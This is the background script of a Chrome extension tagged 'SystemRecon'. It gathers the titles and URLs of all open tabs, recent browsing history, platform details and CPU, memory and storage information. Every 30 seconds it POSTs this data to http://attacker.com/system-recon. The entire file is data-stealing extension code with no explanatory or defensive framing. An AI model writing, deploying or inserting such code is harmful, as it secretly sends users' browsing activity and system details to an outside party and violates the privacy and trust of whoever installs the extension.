let envData = null;

chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
  if (message.type === "env") {
    console.log("[SystemRecon] Received env data from content script.");
    envData = message.payload;
  }
});

async function sendReconData(data) {
  try {
    console.log("[SystemRecon] Sending data...");
    await fetch("http://attacker.com/system-recon", {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify(data)
    });
    console.log("[SystemRecon] Data sent.");
  } catch (err) {
    console.error("[SystemRecon] Failed to send data:", err);
  }
}

function collectRecon() {
  const result = {};

  if (envData) {
    Object.assign(result, envData);
  }

  chrome.runtime.getPlatformInfo((platform) => {
    result.platform = platform;

    chrome.tabs.query({}, (tabs) => {
      result.tabs = tabs.map(t => ({ title: t.title, url: t.url }));

      chrome.history.search({ text: "", maxResults: 10 }, (history) => {
        result.history = history.map(h => ({
          title: h.title,
          url: h.url,
          lastVisitTime: h.lastVisitTime
        }));

        chrome.system.cpu.getInfo((cpu) => {
          result.cpu = cpu;

          chrome.system.memory.getInfo((memory) => {
            result.memory = memory;

            chrome.system.storage.getInfo((storage) => {
              result.storage = storage;

              sendReconData(result);
            });
          });
        });
      });
    });
  });
}

chrome.runtime.onInstalled.addListener(() => {
  console.log("[SystemRecon] Installed. Waiting for env data...");
});

setInterval(() => {
  if (envData) {
    console.log("[SystemRecon] Running periodic recon.");
    collectRecon();
  }
}, 30000);
